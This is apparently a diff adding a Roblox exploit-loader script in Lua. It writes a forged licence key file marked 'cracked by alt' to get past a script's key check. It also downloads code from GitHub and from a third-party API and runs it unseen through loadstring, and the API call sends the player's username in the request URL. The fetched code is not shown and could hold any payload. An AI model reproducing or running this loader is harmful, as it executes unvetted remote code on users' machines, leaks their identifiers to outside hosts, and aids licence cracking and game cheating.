@@ -1,0 +1,23 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/WhatsHisIdentifier/NoKey/refs/heads/main/Discord",true))()
+local HS  = game:GetService("HttpService")
+local lp  = game:GetService("Players").LocalPlayer
+local uid = tostring(lp.UserId)
+local key = "cracked by alt"..uid
+
+
+writefile("GLua_Key_"..uid..".txt", key)
+
+
+local WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua"))()
+WindUI:Notify({
+    Title   = "Success",
+    Content = "Loading script...",
+    Duration = 3
+})
+
+task.wait()
+
+
+local url = "https://api.glua.xyz/gsc/ggev/qiel/GLua.lua?username="..lp.Name
+local src = game:HttpGet(url)
+loadstring(src)()
